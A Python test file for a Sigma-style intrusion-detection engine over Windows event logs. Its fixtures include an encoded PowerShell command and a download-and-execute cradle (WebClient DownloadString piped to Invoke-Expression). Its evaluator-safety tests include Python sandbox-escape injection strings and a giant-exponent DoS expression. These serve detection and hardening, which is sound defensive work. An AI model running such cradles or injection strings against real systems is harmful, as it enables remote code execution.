"""Tests for tools.ids_scan — a small Sigma-style detection engine over Windows
event logs. The matcher and orchestration are pure functions tested with canned
events/rules; the event reader uses an injected runner with canned JSON.
"""

from __future__ import annotations

import time

from tools.host_audit import CmdResult
from tools.ids_scan import (
    match_event, scan_events, read_events, BUNDLED_RULES, _eval_condition,
)


def _det(selection, condition="selection", **extra):
    return {**extra, "selection": selection, "condition": condition}


EVT = {"EventID": 4104, "Channel": "PS", "Message": "powershell -EncodedCommand ZQBjAGgAbwA="}


# ── field matching ────────────────────────────────────────────────────────────

def test_contains_single_value():
    assert match_event(_det({"Message|contains": "EncodedCommand"}), EVT) is True
    assert match_event(_det({"Message|contains": "nothinghere"}), EVT) is False


def test_contains_list_is_or():
    det = _det({"Message|contains": ["nope", "EncodedCommand"]})
    assert match_event(det, EVT) is True


def test_match_is_case_insensitive():
    assert match_event(_det({"Message|contains": "encodedcommand"}), EVT) is True


def test_multiple_fields_in_selection_are_and():
    det = _det({"Message|contains": "powershell", "EventID": 4104})
    assert match_event(det, EVT) is True
    det2 = _det({"Message|contains": "powershell", "EventID": 9999})
    assert match_event(det2, EVT) is False


def test_startswith_endswith():
    assert match_event(_det({"Message|startswith": "powershell"}), EVT) is True
    assert match_event(_det({"Message|endswith": "ZQBjAGgAbwA="}), EVT) is True
    assert match_event(_det({"Message|startswith": "cmd"}), EVT) is False


def test_equals_exact_field():
    assert match_event(_det({"EventID": 4104}), EVT) is True
    assert match_event(_det({"EventID": 4105}), EVT) is False


# ── condition logic ───────────────────────────────────────────────────────────

def test_condition_and_not_filter():
    det = {
        "selection": {"Message|contains": "powershell"},
        "filter": {"Message|contains": "ZQBjAGgAbwA="},
        "condition": "selection and not filter",
    }
    assert match_event(det, EVT) is False  # filter excludes it
    det2 = {
        "selection": {"Message|contains": "powershell"},
        "filter": {"Message|contains": "benign-marker"},
        "condition": "selection and not filter",
    }
    assert match_event(det2, EVT) is True


def test_condition_or():
    det = {
        "sel_a": {"Message|contains": "no-match"},
        "sel_b": {"Message|contains": "EncodedCommand"},
        "condition": "sel_a or sel_b",
    }
    assert match_event(det, EVT) is True


def test_condition_one_of_wildcard():
    det = {
        "selection_enc": {"Message|contains": "EncodedCommand"},
        "selection_iex": {"Message|contains": "IEX"},
        "condition": "1 of selection_*",
    }
    assert match_event(det, EVT) is True


def test_condition_all_of_wildcard():
    det = {
        "selection_ps": {"Message|contains": "powershell"},
        "selection_enc": {"Message|contains": "EncodedCommand"},
        "condition": "all of selection_*",
    }
    assert match_event(det, EVT) is True
    det2 = {
        "selection_ps": {"Message|contains": "powershell"},
        "selection_x": {"Message|contains": "absent"},
        "condition": "all of selection_*",
    }
    assert match_event(det2, EVT) is False


# ── condition evaluator safety (no eval, no arithmetic DoS, no injection) ──────

def test_condition_evaluator_handles_boolean_grammar():
    # The supported boolean grammar must still evaluate correctly.
    assert _eval_condition("a and b", {"a": True, "b": True}) is True
    assert _eval_condition("a and b", {"a": True, "b": False}) is False
    assert _eval_condition("a or b", {"a": False, "b": True}) is True
    assert _eval_condition("a and not b", {"a": True, "b": False}) is True
    assert _eval_condition("not a", {"a": False}) is True
    assert _eval_condition("(a or b) and not c",
                           {"a": True, "b": False, "c": False}) is True


def test_condition_unknown_identifier_is_false_not_error():
    # An unmatched/undeclared block name evaluates to False, never raises.
    assert _eval_condition("selection and missing", {"selection": True}) is False
    assert _eval_condition("missing", {"selection": True}) is False


def test_condition_rejects_arithmetic_dos():
    # A crafted rule must NOT be able to make us evaluate a giant-int expression
    # (the old eval() path computed 2**100000000). The non-boolean expression is
    # rejected and returns False quickly, never hanging.
    start = time.time()
    assert _eval_condition("2 ** 100000000", {}) is False
    assert _eval_condition("a ** b", {"a": 2, "b": 100000000}) is False
    assert time.time() - start < 1.0


def test_condition_rejects_attribute_and_call_injection():
    # Sandbox-escape shapes that reached the old eval() must be rejected outright.
    for cond in (
        "().__class__.__bases__",
        "__import__('os').system('echo pwned')",
        "(9).__class__",
        "[x for x in range(10)]",
        "a if b else c",
    ):
        assert _eval_condition(cond, {"a": True, "b": True, "c": True}) is False


def test_condition_rejects_deeply_nested_expression():
    # A crafted condition with extreme nesting must not crash the engine with an
    # uncaught RecursionError/MemoryError — it returns False, fast.
    start = time.time()
    assert _eval_condition("not " * 5000 + "a", {"a": True}) is False
    assert _eval_condition("(" * 5000 + "a" + ")" * 5000, {"a": True}) is False
    assert time.time() - start < 2.0


def test_condition_rejects_comparisons_and_literals():
    # Only boolean composition of named blocks is allowed; numbers/strings/compares
    # are not part of the Sigma condition grammar we support and must be rejected.
    assert _eval_condition("1 == 1", {}) is False
    assert _eval_condition("'a' == 'a'", {}) is False
    assert _eval_condition("a > b", {"a": True, "b": False}) is False


# ── orchestration ─────────────────────────────────────────────────────────────

RULES = [
    {"title": "Low thing", "level": "low",
     "detection": _det({"Message|contains": "powershell"})},
    {"title": "Encoded PowerShell", "level": "high",
     "detection": _det({"Message|contains": "EncodedCommand"})},
]


def test_scan_events_returns_prioritised_alerts():
    alerts = scan_events([EVT], RULES)
    assert len(alerts) == 2
    assert alerts[0]["level"] == "high"          # high before low
    assert alerts[0]["title"] == "Encoded PowerShell"
    assert alerts[0]["event"]["EventID"] == 4104  # carries the matched event


def test_scan_events_no_match_is_empty():
    clean = {"EventID": 1, "Message": "explorer started"}
    assert scan_events([clean], RULES) == []


def test_cradle_rule_ignores_module_manifest():
    # A PowerShell module manifest (always has ModuleVersion) can contain both a
    # web type and Invoke-Expression in its text but is not a download cradle.
    cradle = next(r for r in BUNDLED_RULES if "cradle" in r["title"].lower())
    manifest = {"Message": "@{ GUID='x'; ModuleVersion='7.0'; "
                           "Net.WebClient; Invoke-Expression }"}
    real = {"Message": "$d=(New-Object Net.WebClient).DownloadString('http://e');"
                       " Invoke-Expression $d"}
    assert match_event(cradle["detection"], manifest) is False
    assert match_event(cradle["detection"], real) is True


def test_bundled_rules_are_valid_sigma_detections():
    # Every shipped rule must have a title, level, and a detection with a condition.
    assert len(BUNDLED_RULES) >= 3
    for r in BUNDLED_RULES:
        assert r["title"] and r["level"]
        assert "condition" in r["detection"]


# ── event reader (injected runner) ────────────────────────────────────────────

def _run(out="", code=0, err=""):
    return lambda args: CmdResult(code=code, out=out, err=err)


def test_read_events_parses_json_array():
    js = ('[{"EventID":4104,"TimeCreated":"2026-06-12T10:00:00","Message":"a"},'
          '{"EventID":4104,"TimeCreated":"2026-06-12T10:01:00","Message":"b"}]')
    evts = read_events(_run(out=js))
    assert len(evts) == 2
    assert evts[0]["Message"] == "a"


def test_read_events_handles_single_object():
    # Get-WinEvent | ConvertTo-Json emits a bare object (not an array) for 1 event.
    js = '{"EventID":4104,"TimeCreated":"2026-06-12T10:00:00","Message":"solo"}'
    evts = read_events(_run(out=js))
    assert len(evts) == 1
    assert evts[0]["Message"] == "solo"


def test_read_events_empty_on_error():
    assert read_events(_run(out="", code=1, err="log not found")) == []
